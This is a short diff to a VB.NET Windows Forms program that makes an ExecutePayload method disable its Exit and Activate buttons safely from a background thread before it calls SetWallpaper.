@@ -1156,9 +1156,16 @@ Public Class Form1
     ' Method to execute the payload in a separate thread
     Private Sub ExecutePayload()
 
-        ' Disable the Exit and Activate buttons
-        ExitButton.Enabled = False
-        ActivateButton.Enabled = False
+        ' Disable the Exit and Activate buttons on the main UI thread
+        If ExitButton.InvokeRequired Then
+            ExitButton.Invoke(Sub()
+                                  ExitButton.Enabled = False
+                                  ActivateButton.Enabled = False
+                              End Sub)
+        Else
+            ExitButton.Enabled = False
+            ActivateButton.Enabled = False
+        End If
 
         ' Execute remaining operations
         SetWallpaper()
